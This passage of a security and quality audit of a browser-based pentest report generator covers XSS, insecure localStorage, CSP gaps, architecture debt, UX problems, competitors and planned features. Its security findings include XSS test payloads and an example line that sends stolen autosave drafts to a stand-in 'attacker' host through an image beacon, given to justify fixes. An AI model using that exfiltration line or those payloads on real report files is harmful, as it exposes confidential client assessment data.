**Recommendation:** Use `setTimeout(() => URL.revokeObjectURL(url), 0)` after `a.click()`, inside one shared `downloadJson(name, obj)` helper.

**Complexity:** Small **Dependencies:** none

---

### [PERF-006] [P3] Auto-detected `logo.jpg` and configured logos are re-encoded to PNG via canvas

**Category:** Performance **Confidence:** High (CONFIRMED code)

**Affected files:** `loadImageAsDataUrl()` (`:1130`), where `canvas.toDataURL()` defaults to PNG.

**Impact:** A JPEG photo-style logo can grow several times in size, which bloats every export and autosave.

**Recommendation:** `fetch(path).then(r => r.blob())`, then `FileReader.readAsDataURL`. This keeps the original bytes and MIME type and needs no canvas.

**Complexity:** Small **Dependencies:** none

---

### [PERF-007] [P3] Unbounded per-dragover layout reads

**Category:** Performance **Confidence:** Medium (CONFIRMED code, not profiled)

**Affected files:** `getDragAfterElement()` / `getDragAfterVulnElement()` (`:2057`, `:2115`)

**Problem:** They call `getBoundingClientRect()` for every block or card on each `dragover` event, and then mutate the DOM (`insertBefore`), which risks layout thrashing.

**Recommendation:**
- Throttle with `requestAnimationFrame`.
- Cache the midpoints at `dragstart`.
- Skip the insert if the position hasn't changed.

**Complexity:** Small **Dependencies:** PERF-001

---

### [PERF-008] [P3] Render-blocking third-party CSS and icon font from jsDelivr

**Category:** Performance **Confidence:** Medium (CONFIRMED code; LCP not measured)

**Affected files:** `rapportgenerator.html:7–8`

**Problem:** Two blocking stylesheets come from a third-party origin. Without network access (air-gapped testing labs are common for pentesters), the UI renders without icons, and every control in the icon rail becomes invisible.

**Recommendation:**
- Vendor the Bootstrap CSS subset and the icon font next to the HTML (still no build step), or ship a self-contained single-file build.
- Add `<link rel="preconnect">` if keeping the CDN.

**What to measure:** Lighthouse LCP/FCP cold vs warm cache; behavior offline (DevTools offline mode).

**Complexity:** Small **Dependencies:** SEC-004

---

## Security Report

**Threat model:**
- The app has no server, so the attack surface is **untrusted input files**: report JSON, library JSON and `settings.json`.
- A secondary surface is **data at rest in the browser**: localStorage on the hosting origin.
- Pentest reports are highly sensitive: client names, vulnerabilities and credentials found during tests.

### [SEC-001] [P1] Stored XSS via imported report JSON (and the autosave restore)

**Severity:** High **Confidence:** High (CONFIRMED runtime) **CWE:** CWE-79 / OWASP A03:2021 Injection

**Affected component:** `renderAll()` writes `f.description` / `f.remediation` raw (`:2682`, `:2687`). Other raw sinks:
- `applyReportPayload()` writes `blocksHtml` raw (`:2821`)
- `renderLogo()` puts `currentLogo` into `src="…"` unescaped (`:2785`)
- `data.companyName` etc. flow into `convertLiteralTokensToSpans` (BUG-010)

**Evidence (`t1.js` T11):** a finding description `<img src=x onerror="window.__descxss=1">` executed on render (`T11_descriptionExecutes:true`).

**Root cause:** Rich text is stored and rendered as unsanitized HTML by design. The README documents it as a known limitation.

**Realistic attack scenario:**
1. A colleague, subcontractor or client sends a `report.json` for review or retest, or a tampered file sits on a shared drive.
2. On import, the script runs in the app's origin.
3. It reads `localStorage['rapportgen:autosave']`, the previous client's draft (see SEC-003), and exfiltrates it with `new Image().src = 'https://attacker/?d=' + …`.
4. It can also silently alter findings, for example lowering severities before PDF export.

**Impact:** Disclosure of confidential client assessment data, and integrity loss of a deliverable.

**Recommended mitigation:**
1. Sanitize all rich HTML on import and before render with an allow-list sanitizer. Two options:
   - **Option A (no dependency):** a small `DOMParser`-based sanitizer that allows formatting tags (`b i u s strong em p br ul ol li blockquote pre code h3 h4 span div img table tr td th a`), strips all `on*` attributes and `style` expressions, and allows `src` only for `data:image/(png|jpeg|gif|webp)` and `href` only for `http(s):` / `mailto:`.
   - **Option B:** vendored DOMPurify (a single file, no build). It is more robust, but it adds a dependency.
2. Validate `currentLogo` with `/^data:image\/(png|jpeg|gif|webp|svg\+xml);base64,/`. Treat SVG with care, or rasterize it.
3. Add a CSP (SEC-005) as defense in depth.

**Verification:** TEST-003 payload corpus: `onerror`, `<svg onload>`, `javascript:` links, `<iframe srcdoc>`, attribute-breakout logo values. None may execute after import.

**Complexity:** Medium **Dependencies:** ARCH-007

---

### [SEC-002] [P1] Stored XSS via imported template library

**Severity:** Medium–High **Confidence:** High (CONFIRMED runtime) **CWE:** CWE-79

**Affected component:** `filterLibrary()` (`:2142`) writes `v.title`, `v.category` and `v.cwe` into `innerHTML` unescaped. Description and remediation then flow into findings and SEC-001.

**Evidence (`t1.js` T5b):** title `<img src=x onerror=…>` executed as soon as the library list rendered (`T5b_libraryTitleExecutes:true`).

**Attack scenario:** The library is explicitly designed to be a **firm-wide shared file** (README: "Firm-wide settings"). One poisoned `library.json` on a shared drive or in a repo executes for every consultant who opens Add Finding, even before they import a report.

**Mitigation:** Escape title, category and CWE with `escapeHtml`, or build the nodes with `textContent`. Sanitize description and remediation as in SEC-001 when a template is loaded.

**Verification:** TEST-003 library corpus.

**Complexity:** Small **Dependencies:** BUG-006

---

### [SEC-003] [P2] Confidential report drafts persist unencrypted in localStorage on a shared origin

**Severity:** Medium **Confidence:** Medium. Behavior is CONFIRMED in code; the origin-sharing point is a property of GitHub Pages user sites.

**CWE:** CWE-922 (Insecure Storage of Sensitive Information), CWE-312

**Affected component:** `autosaveReport()` (`:1262`) and `persistField()` (`:1233`)

**Problem:** The full report (findings, evidence screenshots, client identity) is written to `localStorage` in plaintext. It stays there indefinitely after closing; only "New Report" or declining the restore clears it.

On the hosted demo the origin is `https://jozeta.github.io`. All GitHub Pages project sites of that account share it, so **any other page published under that account can read the drafts**. That includes a future demo, a compromised dependency on another project page, or the XSS in SEC-001.

**Scenarios:** shared or borrowed machines, browser-profile sync and backups, or another project on the same Pages account.

**Mitigation:**
1. Document clearly that serious use should be self-hosted on a dedicated origin, or opened locally.
2. Add an "Autosave on this device" toggle (default on, but visible).
3. Offer optional passphrase encryption of the autosave and the exports (WebCrypto AES-GCM with a PBKDF2/Argon-style key; see FEAT-010).
4. Clear drafts after a successful export (BUG-004).

**Verification:** Inspect Application → Local Storage after export (should be empty) and with encryption enabled (ciphertext only).

**Complexity:** Medium **Dependencies:** BUG-004, BUG-005, FEAT-010

---

### [SEC-004] [P3] Third-party CDN stylesheets loaded without Subresource Integrity

**Severity:** Low **Confidence:** High (CONFIRMED code: `:7–8`, no `integrity`)

**CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

**Scenario:** A CDN or package compromise injects CSS. CSS alone can exfiltrate attribute values via attribute selectors and `background:url()`, and can deface the output.

**Mitigation:** Add `integrity="sha384-…" crossorigin="anonymous"` (versions are already pinned), or vendor the files locally (PERF-008).

**Complexity:** Small **Dependencies:** none

---

### [SEC-005] [P3] No Content-Security-Policy; 153 inline event handlers prevent adopting a strict one

**Severity:** Low (defense-in-depth) **Confidence:** High (CONFIRMED by static count)

**Problem:** There is no CSP. Because of the inline `on*` attributes (153) and the inline `<script>`, a strict CSP (no `'unsafe-inline'`) can't be applied. A meta-tag CSP like the following would already block exfiltration via fetch or XHR, though not via image beacons unless `img-src` is restricted to `'self' data: blob:`:

```
default-src 'self'; img-src 'self' data: blob:; style-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'; font-src https://cdn.jsdelivr.net; connect-src 'self'; script-src 'self' 'unsafe-inline'
```

**Mitigation:**
1. Add that CSP now: it limits `connect-src` and `img-src`, which removes the easy exfiltration channels in SEC-001.
2. Later, move the handlers to delegated listeners (ARCH-001) and drop `'unsafe-inline'` from `script-src` (hash the main script).

**Verification:** The DevTools console shows a CSP violation for an `<img src="https://attacker/…">` injected in a test payload.

**Complexity:** Small (step 1) / Medium (step 2) **Dependencies:** ARCH-001

---

### [SEC-006] [P4] `target="_blank"` CWE links lack `rel="noopener noreferrer"`

**Severity:** Informational **Confidence:** High (CONFIRMED code, `:2322`)

**Problem:** Modern browsers imply `noopener`, but `noreferrer` is absent, so the report URL is sent as `Referer` to cwe.mitre.org. That is minor for a GitHub Pages URL, but relevant if self-hosted on an internal hostname.

**Mitigation:** Add `rel="noopener noreferrer"`.

**Complexity:** Small

---

## Architecture and Maintainability

### [ARCH-001] [P2] 2,900-line single file with global state and 153 inline handlers keyed by array index

**Category:** Architecture **Confidence:** High

**Affected files:** `rapportgenerator.html`

**Problem:**
- Every function is global and is wired through inline `onclick="fn(${i})"`.
- Listener lifecycle is ad hoc, which caused PERF-001.
- Index-captured handlers become wrong whenever `findings` is mutated without re-render.
- There is no seam for testing.

**Recommendation:** Keep the "no build, no framework" philosophy, but:
1. Use delegated listeners with `data-action` attributes (one dispatcher).
2. Organize the code into clearly bounded sections: model, persistence, render, editor, dialogs, IO.
3. Optionally split into ES modules.

**Caveat:** `<script type="module">` does not load under `file://`. Either accept that, since the JSON files already require HTTP, or keep a single file.

**Validation:** No inline `on*` remains in generated markup, and the TEST-004 listener counts are stable.

**Complexity:** Large (do it incrementally, in the areas touched by fixes) **Dependencies:** TEST-001 first

---

### [ARCH-002] [P2] Two sources of truth (JS model plus DOM-as-state) and attribute-based serialization

**Category:** Architecture **Confidence:** High

**Problem:** Sections, order, metadata and the TOC state live in the DOM. Findings live in JS. Persistence serializes `innerHTML` and relies on attribute mirroring of form values. This is the direct root of BUG-002 and BUG-003, and contributes to BUG-012.

**Recommendation:** Introduce an explicit document model:

```js
report = {
  schemaVersion,
  meta: {...},
  sections: [{ id, kind: 'text' | 'details' | 'pagebreak' | 'builtin', title, html }],
  findings: [...],
  settings: {...},
  images: {...}
}
```

Render sections from it, and serialize the model, not the DOM. This can be done incrementally: start with `meta` (BUG-002), then sections.

**Complexity:** Large **Dependencies:** ARCH-004, TEST-002

---

### [ARCH-003] [P2] Findings have no stable identity

**Category:** Architecture **Confidence:** High

**Problem:** Findings are addressed by array index everywhere (handlers, `data-index`, summary numbering, "Delete Finding #n").

**Impact:** This blocks retests (FEAT-004), diffing, comments, partial re-render (PERF-004) and cross-references such as "see Finding F-012".

**Recommendation:**
- Add `id: crypto.randomUUID()` on create and import (backfill for old files).
- Address findings by id.
- Keep the display number derived from order.

**Complexity:** Medium **Dependencies:** none

---

### [ARCH-004] [P2] Report and library payloads have no schema version or validation layer

**Category:** Architecture **Confidence:** High

**Problem:** The payload has no `schemaVersion`. Import trusts shape and types (BUG-003, BUG-006, SEC-001).

**Recommendation:**
- Add `schemaVersion: 2` and a `migrate(payload)` chain (v1 = current files without a version).
- Add `validateReport` / `validateLibrary` functions returning a list of errors that is shown to the user.

**Complexity:** Small–Medium **Dependencies:** none

---

### [ARCH-005] [P3] Rich-text editing relies on deprecated `document.execCommand`

**Category:** Architecture **Confidence:** High (`:1889`, `:1904`)

**Problem:** It still works in all major browsers but is unspecified and inconsistent: font-size produces `<font size>`, and lists differ per browser.

**Recommendation:**
- Keep it for now; it is isolated in `formatDoc`.
- Normalize the output in the sanitizer (SEC-001), for example `<font>` to `<span style>`.
- Revisit only if a browser regresses.

**Complexity:** Small (normalize) **Dependencies:** SEC-001

---

### [ARCH-006] [P1] Project is not under version control

**Category:** Architecture / process **Confidence:** High (`git rev-parse` reports `fatal: not a git repository`; `.gitignore` exists but there is no `.git`)

**Problem:** The live demo is on GitHub, but this working copy has no history.

**Impact:** No safe rollback, no reviewable diffs for the fixes in this backlog, and no way to bisect regressions.

**Recommendation:** `git init`, or clone the GitHub repo and copy any local changes over, before any implementation work.

**Complexity:** Small **Dependencies:** none

---

### [ARCH-007] [P2] Escaping is applied ad hoc

**Category:** Architecture **Confidence:** High

**Problem:** `escapeHtml` is used in 16 places, but several sinks are unescaped:
- `filterLibrary` (`:2142`)
- `addNewSection` / `addNewDetailsSection` headline (`:1956`, `:1991`)
- `renderLogo` (`:2785`)
- token values (`:1532`)
- the `retestDate` value attribute (`:2673`)
- `f.description` / `f.remediation`

**Recommendation:**
- Add a tagged template helper (`html\`…\``) that escapes interpolations by default, with an explicit `raw(sanitize(x))` for rich fields.
- Lint with a simple grep test (TEST-005) for `innerHTML` writes with unescaped `${`.

**Complexity:** Medium **Dependencies:** SEC-001

---

## UI/UX Report

Evaluated via screenshots (desktop at 1400 px with the sidebar open; mobile at 390 px) and code inspection.

### [UI-001] [P2] Modals: Escape doesn't close them, focus isn't trapped or restored

**Screen:** Add Finding, Add Section, Find & Replace and the app dialog (`:916–963`)

**Problem / Evidence (`t3.js` T17):** after `openAddFindingModal()` and Escape, the overlay is still `display:flex`. There is no keydown handler for Escape, no focus trap, and focus isn't returned to the trigger. The markup does have `role="dialog"` and `aria-modal="true"`.

**Improved interaction:**
- Escape closes (or cancels, for confirms).
- Tab cycles within the dialog.
- Focus returns to the invoking button.
- Enter submits the primary action.

**Benefit:** Keyboard and screen-reader users can use the app (WCAG 2.1.2, 2.4.3).

**Implementation:** One `openModal(el, {onClose})` helper; consider the native `<dialog>` element with `showModal()`, which provides the focus trap and Escape handling for free.

**Acceptance:**
- Escape closes every modal.
- Focus returns to the trigger.
- Tab never leaves an open modal.

---

### [UI-002] [P2] Asset tagging uses native `prompt()` with confusing wording

**Screen:** Finding card "Affected Assets" (`addInlineAsset` `:2300`, `editInlineAsset` `:2309`)

**Problem:**
- `prompt("Enter asset tracking identification tag:")` and `prompt("Update asset designation reference:")` contradict the README's "no native popups".
- They block the page.
- Only one asset can be added at a time.
- Editing requires a hidden double-click.

**Improved interaction:** an inline chip input: type, then Enter or comma to add, Backspace to remove, paste a comma- or newline-separated list to add many (hosts from a scope list), and click a chip to edit.

**Acceptance:** Pasting 20 hosts adds 20 chips, and there are no native dialogs.

---

### [UI-003] [P2] "Add Finding" always appends to the first Detailed Findings section

**Screen:** Add Finding modal (`addFinding` `:2212–2213`)

**Problem:** With multiple Detailed Findings sections (e.g. "External" and "Internal"), new findings always land in the first one, and the user must drag them across.

**Improvement:** A "Target section" select in the modal, defaulting to the last-used section. Also add "Add finding here" buttons in each section's empty state.

**Acceptance:** A finding is appended to the chosen section, and the choice is remembered for the session.

---

### [UI-004] [P2] Library search is title/CWE-only, has no keyboard navigation, and duplicates are indistinguishable

**Screen:** Add Finding modal (`filterLibrary` `:2124`)

**Problem:**
- Searching "kerberoast" or "S3 bucket" misses templates whose title doesn't contain the word.
- There is no match highlighting.
- Arrow and Enter keys don't work.
- Clicking a template silently overwrites anything already typed in the form.
- 7 titles are duplicated (BUG-014).

**Improvement:**
- Tokenized search across title, category, CWE and description, ranked by field.
- Arrow and Enter to pick, plus a preview pane.
- Confirm before overwriting a non-empty form.
- Show the category badge.

**Acceptance:** Multi-word queries match across fields, keyboard-only selection works, and edits are never lost silently.

---

### [UI-005] [P2] No undo for destructive or bulk operations

**Screens:** delete finding or section, Find & Replace (all, no preview), Assessment Type switch (overwrites nine sections), import.

**Problem:** Each of these is guarded only by a confirm and cannot be undone. Find & Replace has no "find next" or preview.

**Improvement:**
- A snapshot-based undo stack (reuse `buildReportPayload`, last 20 states) with Ctrl/Cmd+Z when not inside a contenteditable.
- Find & Replace shows a match count before replacing, and highlights matches.

**Acceptance:** Every destructive action can be undone once, and Find & Replace previews the count.

**Dependencies:** BUG-003 (atomic apply), PERF-003 (snapshot size)

---

### [UI-006] [P3] Narrow and mobile layout overflows horizontally and breaks the title mid-word

**Screen:** Report canvas at 390 px

**Evidence:** at 390 px viewport, `scrollWidth` is 434 px (horizontal scroll). The heading wraps as "ASSESSME / NT REPORT". The floating action buttons overlap the paper. Checked with a screenshot during the audit.

**Improvement:**
- `overflow-wrap: break-word; hyphens: auto` on `h1`.
- Clamp the font size (`clamp(1.6rem, 6vw, 2.5rem)`).
- Reduce paper padding below 576 px.
- Fix the element that causes the 44 px overflow (likely the metadata row with negative margins or the block-controls rail).

**Benefit:** Reviewing a report on a tablet or phone becomes usable. Authoring stays desktop-first.

**Acceptance:** No horizontal scroll at 360–768 px, and the title wraps at word boundaries.

---

### [UI-007] [P3] Two scoring systems (5×5 matrix and CVSS) with no reconciliation

**Screen:** Finding card metadata

**Problem:**
- Severity, the badge, the matrix and the executive counts derive only from Impact × Exploitability.
- The CVSS score is free text: there is no validation (`type=number` is not enforced; it is stored as a string) and no severity mapping.
- A CVSS 9.8 finding can display "Low".

**Improvement:**
- Validate the vector and score (FEAT-001).
- Show the CVSS qualitative severity next to the matrix severity.
- Flag mismatches in the Pre-Export Checklist.
- Optionally add a setting "Severity source: Matrix | CVSS".

**Acceptance:** A mismatch over one band shows a checklist warning, and an invalid vector shows inline validation.

---

### [UI-008] [P3] Export always downloads `report.json`

**Screen:** Export Report (`:2866`)

**Problem:** Multiple clients and versions all collide as `report (3).json`.

**Improvement:** `${client}-${assessmentType}-${YYYY-MM-DD}.json`, sanitized for file names. Optionally use the File System Access API "Save as…" where supported, so it can save back to the same file.

**Acceptance:** The file name includes client and date.

---

### [UI-009] [P3] No visible save state

**Screen:** Sidebar header / Save panel

**Problem:** Unsaved changes are only signalled by the `beforeunload` prompt. Users don't know whether autosave works (BUG-005) or when they last exported.

**Improvement:**
- A status line: "Unsaved changes · Autosaved 18:42 · Last exported 17:10".
- A warning state when autosave fails.

**Acceptance:** The status updates within 1 s of each event, and an autosave failure turns it red with an "Export now" action.

---

### [UI-010] [P3] The Print Watermark tooltip stops after "Requires"

**Screen:** Sidebar → Settings → Print Watermark (ⓘ)

**Problem:** The tooltip's quotes were written as `\"` inside an HTML attribute. HTML has no backslash escape, so the attribute ended at the first quote. The tooltip read "…your own custom text. Requires \" and the rest, which explains that "Background graphics" must be on in the print dialog, was lost as stray attributes.

**Fix:** The quotes are `&quot;`. Found while adding the Swedish interface (the full text is now in the translation table).

**Acceptance:** The tooltip includes the "Background graphics" / "More settings" instructions, in both languages.

---

## Competitive Analysis

**Category:** penetration-test / security-assessment report generation. Research was done with web search and fetches of primary sources (GitHub READMEs, vendor docs and pages) on 2026-11-01. Vendor marketing claims are labelled as such.

### [COMP-001] SysReptor (Syslifters)
**Verified:**
- "Design your report in HTML", "Write it in Markdown", "Render to PDF", "Self-hosted or Cloud" ([GitHub README](https://github.com/Syslifters/sysreptor)).
- Finding templates to "reuse XSS/SQLi text, CVSS, tags" ([FAQ](https://docs.sysreptor.com/faq/application)).
- A built-in CVSS editor ([blog post](https://docs.sysreptor.com/show-and-tell/2023/05/30/builtin-cvss-editor/)).
- CVSS 4.0 support added in release 2023.142 ([CHANGELOG](https://github.com/Syslifters/sysreptor/blob/main/CHANGELOG.md)).
- Spell check, roles and comments are Professional-tier features (FAQ).

**Not verified:** collaboration details and encryption features.

### [COMP-002] PwnDoc
**Verified ([GitHub](https://github.com/pwndoc/pwndoc)):** MIT license, plus these features:
- "Docx Report Generation" and "Docx Template customization"
- "Multi-User reporting with real-time collaboration"
- "Retest and multi-audit workflows"
- "Vulnerabilities Management with CVSS v3 and v4 scoring"
- "Add custom fields to Vulnerabilities"
- "Multiple Language support"
- an audit review/approval workflow

**Not verified:** the tech stack and import formats (not stated on that page).

### [COMP-003] Ghostwriter (SpecterOps)
**Verified ([GitHub](https://github.com/GhostManager/Ghostwriter)):** BSD-3, Python/Django, plus:
- Jinja2-templated DOCX reports; XLSX/PPTX/JSON outputs are mentioned
- a reusable findings library
- client, project and infrastructure tracking, plus evidence files
- collaborative writing and a GraphQL API
- RBAC, SSO and MFA
- Mythic C2 and Cobalt Strike activity-log integrations

CVSS was not mentioned on the page.

### [COMP-004] Dradis Community Edition
**Verified ([dradis.com/ce](https://dradis.com/ce/)):**
- GPLv2.
- Imports from Nessus, Burp, Nmap, Nexpose, Nikto, Qualys, ZAP, OpenVAS and others (47+ connectors), plus a custom CSV importer.
- HTML, PDF and CSV export; testing checklists and methodologies; a findings library.
- Pro adds QA workflows, a client portal, and Jira/ServiceNow/Azure DevOps ticketing.
- The page is internally inconsistent about the CE project limits and export formats.

### [COMP-005] PlexTrac (commercial)
**Vendor claims ([pentest reporting page](https://plextrac.com/solutions/pentest-reporting/), [use case](https://plextrac.com/use-case/plextrac-for-pentest-reporting)):**
- Ingest and deduplicate findings from scanners.
- Reusable content library, no-code report customizer, AI-assisted authoring (cloud-only per vendor).
- Workflow automation (auto-create tickets on new criticals), client-portal delivery.
- "Up to 75%" time savings is a vendor figure and was not verified.

A [G2 review](https://g2.com/products/plextrac/reviews) notes integration friction with niche tools.

### [COMP-006] Faraday (Infobyte)
**Per vendor and aggregator pages** ([faradaysec.com](https://faradaysec.com/faraday-open-source-vulnerability-managment-tool), [appsecsanta](https://appsecsanta.com/faraday)):
- GPL-3.0 community edition.
- Normalizes and deduplicates output from 80–150+ tools (counts differ by source).
- Multi-user workspaces, remote scan agents, PDF/DOCX reporting.

I did not open the GitHub repository itself, so star and release figures are not verified.

### [COMP-007] Positioning finding: Rapportgenerator's unique advantage is the zero-infrastructure, data-never-leaves-the-browser model
The sources show **SysReptor** ("Self-hosted or Cloud"), **Ghostwriter** (Django server), **Faraday** (server/workspaces) and **PlexTrac** (SaaS/on-prem) as server applications. **PwnDoc** and **Dradis** are also server applications from my prior knowledge; that wasn't re-verified on the pages fetched.

None of them can be opened as a single file with no install. For freelancers, small firms, students (OSCP-style exam reports, which SysReptor targets) and air-gapped engagements, this is the competitive wedge. **Features should be chosen to strengthen that wedge, not to imitate multi-user servers.**

### Comparison matrix

| App | Purpose | Key features | Unique capability | Strengths | Weaknesses (for our users) | Our gaps | Opportunity |
|---|---|---|---|---|---|---|---|
| **Rapportgenerator** | Single-user report builder | 270 templates, 5×5 matrix, live tokens, checklist, print-to-PDF | No install, no server, offline-capable | Fastest start, privacy | No CVSS calc, no import, XSS, data bugs | — | — |
| SysReptor (COMP-001) | Pentest reporting platform | HTML/CSS design, Markdown, PDF, templates, CVSS editor (3.1/4.0) | Pixel-perfect HTML→PDF designs | Polished output, template reuse | Needs server/cloud; spellcheck is paid | CVSS editor, spellcheck, Markdown | FEAT-001, FEAT-007 |
| PwnDoc (COMP-002) | Collaborative DOCX reporting | DOCX templates, CVSS v3/v4, retest, custom fields, multi-language | Retest & review workflow | Word output clients expect | Server, Docker | DOCX, retest, custom fields | FEAT-003, FEAT-004, FEAT-006 |
| Ghostwriter (COMP-003) | Red-team ops + reporting | DOCX/XLSX/PPTX, findings library, evidence, GraphQL | Infra and C2 log integration | Engagement management | Heavy for small teams | Evidence management, multiple outputs | FEAT-005, FEAT-011 |
| Dradis CE (COMP-004) | Collaboration + tool import | 47+ scanner connectors, checklists, HTML/PDF/CSV | Breadth of importers | Fast from scanner output to report | Server; CE limits | Scanner import, methodology checklists | FEAT-002, FEAT-009 |
| PlexTrac (COMP-005) | Commercial reporting & exposure mgmt | Ingest/dedupe, content library, AI, workflows, client portal | Remediation workflows | Enterprise scale | Cost, cloud for AI | Remediation export | FEAT-011 |
| Faraday (COMP-006) | Vuln management + pentest | Multi-tool normalization, agents, PDF/DOCX | Scan orchestration | Dedupe at scale | Heavy | Dedup on import | FEAT-002 |

---

## Feature Recommendations

### [FEAT-001] [P2] Built-in CVSS 3.1 and 4.0 vector calculator and validator

**Feature:** An interactive metric picker per finding, plus vector parsing, base-score computation, qualitative severity, and validation of pasted vectors.

**User problem:** Today the user must open FIRST.org, copy the vector and score by hand, and nothing checks consistency (UI-007).

**Value:** CVSS is expected in most reports and is commonly required by clients.

**Competitors:** SysReptor has a built-in CVSS editor and 4.0 support (COMP-001). PwnDoc offers CVSS v3 and v4 (COMP-002).

**Implementation:**
- Pure JS functions implementing the published FIRST specification formulas: v3.1 roundup arithmetic and the v4.0 MacroVector lookup table, so no network or dependency is needed.
- A modal with metric radio groups, and the score shown on the card.

**Architectural changes:** Add finding fields `cvssVersion`, `cvssVector`, `cvssScore` (computed) and `cvssSeverity`.

**Dependencies:** UI-007, ARCH-004 **Complexity:** Medium (v3.1 Small, v4.0 Medium)

**Impact:** High. **Risk:** Formula errors, so test against FIRST's published example vectors.

**Acceptance:** 30 reference vectors from the FIRST spec produce identical scores, invalid vectors are rejected inline, and the checklist flags a CVSS/matrix mismatch.

---

### [FEAT-002] [P2] Client-side scanner import (Burp XML, Nessus `.nessus`, Nmap XML, OWASP ZAP JSON)

**User problem:** Findings and affected hosts are re-typed from scanner output by hand.

**Value:** Drafting goes from hours to minutes, and it is the main reason teams pick Dradis, Faraday or PlexTrac.

**Competitors:** Dradis (47+ connectors), PlexTrac (ingest and dedupe), Faraday (normalization) (COMP-004, COMP-005, COMP-006).

**Implementation:**
1. `DOMParser` for XML.
2. Map each issue (plugin or issue type) to a draft finding, merging hosts into `assets` and deduplicating by issue type.
3. Match against the library by CWE or title to pre-fill text.
4. A review screen to select which findings to import.

Everything happens in the browser, which preserves the privacy wedge (COMP-007).

**Dependencies:** ARCH-003 (ids), SEC-001 (sanitize the imported text) **Complexity:** Large (start with Nessus and Burp)

**Impact:** High. **Risks:** Format drift between scanner versions, and huge files (stream-parse, or cap the size).

**Acceptance:** A sample `.nessus` with 3 hosts × 10 plugins yields 10 findings with 3 assets each; nothing executes from imported text.

---

### [FEAT-003] [P3] Word-compatible export

**User problem:** Many clients and QA processes require an editable Word deliverable.

**Competitors:** PwnDoc and Ghostwriter are DOCX-first (COMP-002, COMP-003).

**Implementation (no dependency):**
- Export an HTML document with Word namespaces as `.doc`, which Word opens with styles and tables intact.
- Full `.docx` (OOXML zip) needs a zip writer. Either vendor a small one or hand-roll a STORE-only zip, which is Medium effort.

**Complexity:** Medium **Impact:** Medium–High **Risks:** Layout fidelity (matrix colors, page breaks).

**Acceptance:** Opens in Word and LibreOffice with headings, tables, severity colors and images.

---

### [FEAT-004] [P2] Retest workflow and report diff

**User problem:** Retest reports today mean manually editing statuses, with no record of what changed since the original test.

**Competitors:** PwnDoc has "Retest and multi-audit workflows" (COMP-002).

**Implementation:**
1. "Start retest from this report" freezes `originalStatus` and `originalSeverity` per finding (needs ARCH-003 ids).
2. Retest date and evidence per finding (`retestDate` already exists).
3. An auto-generated "Retest Summary" section: table of finding, original severity, retest status and date.
4. Severity counts that respect status (BUG-007).

**Complexity:** Medium **Impact:** High for consultancies with retest cycles.

**Acceptance:** A retest of a 10-finding report produces a correct summary table, and the original report's values remain visible.

---

### [FEAT-005] [P2] Evidence and screenshot handling: paste, compress, caption, redact

**User problem:**
- Screenshots are the bulk of the evidence and are inserted only via a file picker, at full size.
- There are no captions or figure numbers.
- Sensitive data in screenshots (passwords, PII) can't be redacted in-app.

**Competitors:** Ghostwriter manages evidence files (COMP-003).

**Implementation:**
- Clipboard paste handler in editable fields.
- Canvas downscale and re-encode (PERF-003).
- A `<figure><figcaption>` wrapper with auto "Figure n".
- A simple redaction tool: draw black rectangles on a canvas overlay, then flatten.

**Complexity:** Medium **Impact:** High **Risk:** Caption numbering in print, which can be handled with CSS counters.

**Acceptance:** Pasting a screenshot inserts a compressed figure with a caption, and redacted areas are unrecoverable in the exported data (the flattened bitmap).

---

### [FEAT-006] [P3] Custom fields and tags on findings and library templates

**Feature:** Configurable extra fields (e.g. "OWASP 2021 category", "MITRE ATT&CK technique", "References", "Likelihood rationale") and tags for library filtering.

**Competitors:** PwnDoc custom vulnerability fields (COMP-002); SysReptor templates with tags (COMP-001).

**Implementation:** A `customFields` schema in `settings.json`, rendered generically in cards. `tags[]` in library entries, plus a tag filter.

**Complexity:** Medium **Acceptance:** A field defined in `settings.json` appears on every finding, is exported and prints.

---

### [FEAT-007] [P3] Spell checking and report language

**User problem:** Typos in client deliverables, and non-English reports.

**Competitors:** SysReptor offers spell check (Professional tier); PwnDoc offers multiple languages (COMP-001, COMP-002).

**Implementation:**
- Small: set `spellcheck="true"` and a report-level `lang` attribute (a select) on the printable report, which enables the browser's native spellchecker for that language.
- Medium: localized `report-defaults.json` sets per language, for example `templates[type][lang]`.

**Complexity:** Small (step 1) **Acceptance:** Misspellings are underlined in the editor, and the `lang` attribute is in the exported HTML.

---

### [FEAT-008] [P3] Auto-sort and number findings by severity

**User problem:** Reports conventionally list Critical → Low, so manual drag ordering is tedious and error-prone.

**Implementation:** A "Sort by severity" action per Detailed Findings section, with ties broken by CVSS and then title. Optional ID prefixes such as `C-01` or `H-02`.

**Complexity:** Small **Acceptance:** One click orders a section, and it can be undone (UI-005).

---

### [FEAT-009] [P3] Executive visuals and methodology checklists

**Feature:**
- A severity bar or donut chart and a status breakdown on the executive summary, as inline SVG with no library.
- Optional methodology checklists (OWASP WSTG, PTES) per Assessment Type that render a coverage appendix.

**Competitors:** Dradis checklists and methodologies (COMP-004).

**Complexity:** Small (chart), Medium (checklists) **Acceptance:** The chart matches the severity table and prints in color.

---

### [FEAT-010] [P3] Password-encrypted report files and drafts

**User problem:** Report JSON files are emailed or stored on shared drives in plaintext (SEC-003).

**Value:** A differentiator for a privacy-first tool (COMP-007).

**Implementation:**
- WebCrypto: PBKDF2-SHA256 with ≥600k iterations (or a scrypt port) and AES-GCM.
- File format `{format:'rapportgen-enc', v:1, salt, iv, ct}`.
- Import detects the format and asks for the passphrase.

**Complexity:** Medium **Risk:** A lost passphrase means lost data, so the UI must say so clearly.

**Acceptance:** An encrypted export can't be read without the passphrase and round-trips exactly with it.

---

### [FEAT-011] [P4] Remediation tracker export (CSV / Jira-importable)

**User problem:** Clients move findings into ticketing systems by hand.

**Competitors:** Dradis Pro (Jira/ServiceNow/Azure DevOps), PlexTrac workflows (COMP-004, COMP-005).

**Implementation:** CSV with id, title, severity, CVSS, assets, status, plain-text remediation and owner columns (matching the Action Planner). Jira's CSV importer can map these columns.

**Complexity:** Small **Acceptance:** The CSV opens in Excel with correct escaping and imports into Jira with field mapping.

---

### [FEAT-012] [P4] Real-time multi-user collaboration: recommend **not** building

**Rationale:** Every server competitor already does this (COMP-001 to COMP-006). It would require a backend and would destroy the zero-infrastructure wedge (COMP-007).

**Alternative (Medium):** A "merge findings from another report file" import (by finding id) so two testers can work separately and combine their work.

---

## Testing and Quality Assurance

**Current state:** there are **no tests**, no `package.json`, no linter configuration and no CI. The only verification available is manual.

### [TEST-001] [P1] Add a zero-install browser regression harness

